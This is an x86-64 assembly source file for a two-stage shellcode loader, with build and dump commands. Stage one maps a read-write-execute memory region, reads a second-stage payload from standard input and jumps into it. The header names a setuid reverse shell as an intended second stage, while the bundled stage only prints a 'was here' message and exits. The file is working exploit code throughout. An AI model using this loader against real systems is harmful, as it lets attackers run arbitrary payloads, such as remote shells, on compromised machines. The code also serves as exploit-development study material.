/*

Author: Abhinav Thakur
File:   multistage.s
Compile:        $ gcc -Wl,-N -nostdlib -static multistage.s -o ./multistage.elf
Dump shellcode :$ objcopy --dump-section .text=multistage.raw ./multistage.elf
Run            :$ ./multistage.elf

mmap + read + print_message_shellcode
OR
mmap() -> read() -> [setuid_reverse_shell] socket() -> connect() -> dup2() -> setuid() -> execve() -> exit()
		
kernel syscall interface uses the following registers to pass
syscall arguments -> %rdi, %rsi, %rdx, %r10, %r8, %r9

*/

.global _start
_start:
.intel_syntax noprefix

stage1:
	/*
		call stage2 payload & execute. Map a memory region called
		shelter of size 0xX000 bytes having RWX permissions. 

		void *shelter = mmap(0, 0xffff, 7, 0x22, 0, 0);
	*/
	push 9
	pop rax			/* rax = 9 (syscall number) */
	xor edi, edi	/* rdi = 0 (kernel-suggested addr) */
	push 0xffff
	pop rsi			/* rsi = 0xffff (length of region to allocate) */
	push 7
	pop rdx			/* rdx = 7 (prot: PROT_READ|PROT_WRITE|PROT_EXEC) */
	push 0x22
	pop r10			/* r10 = 0x22 (flags: MAP_PRIVATE|MAP_ANONYMOUS) */
	xor r8, r8		/* r8 = 0 (fd) (ignored for anonymous mapping) */
	xor r9, r9		/* r9 = 0 (offset) */ 
	push rsi		/* push rsi for next read(0, XXX, rsi) */
	syscall
	
	/* 
		Read 2nd stage shellcode in shelter.
		read (0, rax, rsi); 
	*/
	pop rdx			/* rdx = pushed rsi (in above syscall) */
	push rax		/* push mmap address (i.e. shelter) on stack */
	push rax
	pop rsi			/* rsi = (void *)rax (ret value from mmap(2)) */
	xor edi, edi	/* rdi = 0 (STDIN_FILENO) */
	xor eax, eax	/* rax = 0 (syscall number) */
	syscall

	pop rbx			/* rbx = shelter */ 
	jmp rbx			/* transfer code flow to shellter */

/* 
	padding of NOPs depending of how long the first read() is,
	i.e, Xtimes = max_bytes_read_on_stage1 - sizeof(stage1_payload) 
*/
//.space Xtimes, 0x90
.space 5, 0x90

/* Now send stage2 payload in target communication channel */
        /* write (1, "compilepeace was here x_x\n", 26);  */
        xor rdi, rdi
        push rdi                /* push a NULL QUADWORD on stack (string termination) */
        inc rdi                 /* rdi = 1 (STDOUT_FILENO) */
        mov word ptr [rsp], 0x0a78      /* "\nx" */
        mov rax, 0x5f78206572656820
        push rax                /* " here x_" (in LE byte order) */
        mov rax, 0x7361772065636165
        push rax                /* "eace was" (in LE byte order) */
        mov rax, 0x70656c69706d6f63
        push rax                /* "compilep" (in LE byte order) */
        push rsp
        pop rsi                 /* rsi = rsp (points to -> "compil.....\n" on stack) */
        push 26
        pop rdx                 /* rdx = 26 (msg length) */
        push 1
        pop rax                 /* rax = 1 (syscall number) */
        syscall

        /* exit (7) */
        push 7
        pop rdi                 /* rdi = 7 (exit status) */
        push 60
        pop rax                 /* rax = 60 (syscall number) */
        syscall
